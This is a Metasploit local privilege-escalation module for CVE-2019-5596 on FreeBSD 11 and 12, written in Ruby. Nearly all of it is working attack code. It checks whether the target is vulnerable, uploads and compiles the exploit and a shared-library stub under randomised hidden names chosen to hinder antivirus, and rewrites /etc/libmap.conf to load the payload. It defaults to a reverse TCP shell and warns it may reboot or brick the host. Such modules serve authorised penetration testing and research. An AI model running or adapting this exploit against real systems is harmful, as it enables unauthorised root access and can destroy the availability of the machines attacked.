##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ManualRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Compile
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'FreeBSD File Descriptor Ref Count Priv Esc',
        'Description'    => %q(
          FreeBSD 12.0 attempts to handle the case where the receiving process does
          not provide a sufficiently large buffer for an incoming control message
          containing rights.  In particular, to avoid leaking the corresponding
          descriptors into the receiving process' descriptor table, the kernel handles
          the truncation case by closing descriptors referenced by the discarded
          message.

          The code which performs this operation failed to release a reference obtained
          on the file corresponding to a received right.  This bug can be used to cause
          the reference counter to wrap around and free the file structure.

          Exploitation results in write access to /etc/libmap.conf where a new dynamic
          object is added which includes our payload.

          WARNING: This exploit is tempermental, often resulting in a system reboot.
          Successful exploitation will alter /etc/libmap.conf.  If the added library
          libno_ex.so.1.0 is deleted, the system will brick.  Attempts to restore
          /etc/libmap.conf automatically fail.  Manually reverting the
          file from the root prompt should be successful though.

          WARNING: Canceling execution of this exploit may case a system reboot,
          or cause the system to brick.  If the system reboots, artifacts will
          remain on disk and require manual cleanup.
        ),
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'h00die', # msf module
            'Peter Holm', # original analysis
            'Karsten KÃ¶nig <karsten@secfault-security.com>' # poc and edb module
          ],
        'Platform'       => [ 'bsd' ],
        'Arch'           => [ ARCH_X64, ARCH_CMD ],
        'SessionTypes'   => [ 'shell' ],
        'Targets'        => [[ 'Auto', {} ]],
        'Privileged'     => true,
        'References'     =>
          [
            ['EDB', '47829'],
            ['URL', 'https://www.freebsd.org/security/advisories/FreeBSD-SA-19:02.fd.asc'],
            ['URL', 'https://secfault-security.com/blog/FreeBSD-SA-1902.fd.html'],
            ['CVE', '2019-5596']
          ],
        'Notes'         => {
          'Stability'   => [CRASH_OS_RESTARTS],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS, SCREEN_EFFECTS]
        },
        'DefaultOptions' => {
          'WfsDelay' => 4_200, # 70min
          'PAYLOAD' => 'bsd/x64/shell_reverse_tcp',
          'PrependSetuid' => true,
        },
        'DisclosureDate' => "Feb 05 2019",
        'DefaultTarget'  => 0
      )
    )
    # force exploit is used to bypass the check command results
    register_advanced_options [
      OptInt.new('Forks',  [ false, 'Number of forks to use', 3 ]),
      OptBool.new('ForceExploit',  [ false, 'Override check result', false ]),
      OptInt.new('Threads',  [ false, 'Number of threads to use', 400 ]),
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
    ]

  end

  # Simplify pulling the writable directory variable
  def base_dir
    datastore['WritableDir'].to_s
  end

  # Simplify uploading and compiling a file
  def upload_and_compile(path, data, cc_cmd='')
    write_file "#{path}.c", data

    if session.type.eql? 'shell'
      cc_cmd = "PATH=$PATH:/usr/bin/ #{cc_cmd}"
    end

    output = cmd_exec cc_cmd

    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{path}.c failed to compile"
    end

    register_file_for_cleanup path
    chmod path
  end

  def has_cc?
    command_exists? 'cc'
  rescue
    raise 'Unable to check for cc'
  end

  def check
    # Check the kernel version to see if its in a vulnerable range
    release = cmd_exec('/sbin/sysctl kern.version').split(' ')
    major = release[2]
    rev = Gem::Version.new(release[3].delete('r'))

    if major.include? '12'
      if major.include? 'STABLE' and rev > Gem::Version.new('343781')
        vprint_error("FreeBSD release #{major} rev r#{rev} is not vulnerable.")
        return CheckCode::Safe
      end
      if major.include? 'RELEASE' and rev >= Gem::Version.new('343790')
        vprint_error("FreeBSD release #{major} rev r#{rev} is not vulnerable.")
        return CheckCode::Safe
      end
    elsif major.include? '11' and (rev <= Gem::Version.new('338618') or rev >= Gem::Version.new('343786'))
      vprint_error("FreeBSD release #{major} rev r#{rev} is not vulnerable.")
      return CheckCode::Safe
    else
      vprint_error("FreeBSD release #{major} rev r#{rev} is not vulnerable.")
      return CheckCode::Safe
    end

    unless file?('/etc/libmap.conf')
      vprint_error('File /etc/libmap.conf not found, and is required for exploitation.')
      return CheckCode::Safe
    end

    cc = has_cc?
    if cc
      vprint_good 'cc is installed'
    else
      print_error 'cc is required for compiling'
      return CheckCode::Safe
    end

    maxfiles = cmd_exec('sysctl kern.maxfiles').split(' ')[1]
    if maxfiles.to_i < 64303
      vprint_error('In testing, when kern.maxfiles is < 60000 the exploit will most likely fail and reboot the system.')
      return CheckCode::Detected #detected, it is vuln, but not exploitable from our testing, but maybe for others?
    end

    vprint_good "FreeBSD release #{major} rev r#{rev} with maxfiles #{maxfiles} is vulnerable"
    CheckCode::Vulnerable
  end

  def exploit
    unless check == CheckCode::Vulnerable
      unless datastore['ForceExploit']
        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    # Check if we're already root
    if is_root?
      unless datastore['ForceExploit']
        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override'
      end
    end

    # Make sure we can write our exploit and payload to the remote system
    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    libmap = read_file('/etc/libmap.conf').to_s
    p = store_loot('libmap.conf', 'text/plain', datastore['RHOST'], libmap, 'Backup of libmap.conf')
    print_status "Stored /etc/libmap.conf in #{p}.  If session cleanup is unsuccessful, system will brick. Use this to unbrick"

    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
    vprint_status("Uploading Payload to #{payload_path}")
    upload_and_chmodx payload_path, generate_payload_exe

    # Upload exploit executable, writing to a random name so AV doesn't have too easy a job
    executable_name = ".#{rand_text_alphanumeric(5..10)}"
    executable_path = "#{base_dir}/#{executable_name}"
    vprint_status 'Live compiling exploit on system...'
    hcw = exploit_data('CVE-2019-5596', 'heavy_cyber_weapon.c').gsub('/tmp/', "#{base_dir}/")
    hcw = hcw.gsub('#define NUM_THREADS 400', "#define NUM_THREADS #{datastore['Threads']}")
    hcw = hcw.gsub('#define NUM_FORKS 3', "#define NUM_FORKS #{datastore['Forks']}")
    vprint_status("Uploading exploit to #{executable_path}")
    upload_and_compile executable_path, strip_comments(hcw), "cc -o #{executable_path} -lpthread #{executable_path}.c"
    rm_f "#{executable_path}.c"

    # upload stub
    stub_name = ".#{rand_text_alphanumeric(5..10)}"
    stub_path = "#{base_dir}/#{stub_name}"
    stub = exploit_data('CVE-2019-5596', 'program.c')
    vprint_status("Uploading Payload Stub to #{stub_path}")
    upload_and_compile stub_path, strip_comments(stub), "cc -o #{stub_path}.o -c #{stub_path}.c -fPIC"
    cmd_exec "cc -shared -Wl,-soname,libno_ex.so.1 -o #{base_dir}/libno_ex.so.1.0 #{stub_path}.o -nostartfiles"
    rm_f "#{stub_path}.c"
    rm_f "#{stub_path}.o"

    runner_name = ".#{rand_text_alphanumeric(5..10)}.sh"
    runner_path = "#{base_dir}/#{runner_name}"
    # umask was in the original exploit, however it seemed to cause the exploit to fail when ported to msf
    runner = %Q{
#!/bin/sh
cp /etc/libmap.conf #{base_dir}/libmap.conf;
#{executable_path};
su;
#{base_dir}/xxxx -c #{payload_path} &
}

    vprint_status("Uploading Payload Runner to #{runner_path}")
    upload_and_chmodx runner_path, runner

    # Launch exploit with a timeout.  We also have a vprint_status so if the user wants all the
    # output from the exploit being run, they can optionally see it
    timeout = 4_200 #70min
    print_status "Launching exploit... May take 20-60 minutes. Start time: #{Time.now}"
    # for unknown reasons, when output isn't redirected, the exploit seems to fail.
    cmd_exec "#{runner_path} > /dev/null" , nil, timeout
  end

  def on_new_session(session)
    super
    # Cleanup will only work if the libmap.conf re-write happened.
    print_status 'Performing Cleanup'
    # we avoid deleting libno_ex.so.1.0 since *if* the libmap.conf change didn't go well
    # we may still brick the system if the file is removed.
    ['dummy', 'dummy2', 'pwn', 'pwn2', 'sync_forks', 'xxxx'].each do |clean|
      rm_f "#{base_dir}/#{clean}"
    end

    for num in 1...datastore['Forks'] do
      rm_f "#{base_dir}/sync_forks#{num}"
    end

    print_error "*************************************************"
    print_good 'Automated attempt to not brick the system failed.'
    print_good "Please run `cp #{base_dir}/libmap.conf /etc/libmap.conf`."
    print_error "*************************************************"
  end
end
